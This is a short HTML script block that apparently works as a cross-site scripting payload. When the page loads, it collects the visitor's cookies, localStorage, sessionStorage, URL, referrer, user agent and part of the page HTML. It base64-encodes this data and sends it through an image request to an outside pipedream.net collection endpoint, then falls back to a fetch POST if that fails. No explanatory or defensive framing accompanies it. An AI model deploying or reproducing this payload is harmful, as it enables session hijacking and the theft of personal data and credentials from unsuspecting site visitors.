<script>
(async () => {
  try {
    let data = {
      cookies: document.cookie,
      ua: navigator.userAgent,
      loc: window.location.href,
      ref: document.referrer,
      local: JSON.stringify(localStorage),
      session: JSON.stringify(sessionStorage),
      html: document.documentElement.outerHTML.slice(0, 5000)
    };

    let img = new Image();
    img.src = 'https://eoat1elxcyeymir.m.pipedream.net/?data=' + btoa(unescape(encodeURIComponent(JSON.stringify(data))));
    document.body.appendChild(img);
  } catch (e) {
    fetch("https://eoat1elxcyeymir.m.pipedream.net", {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({error: e.toString()})
    });
  }
})();
</script>
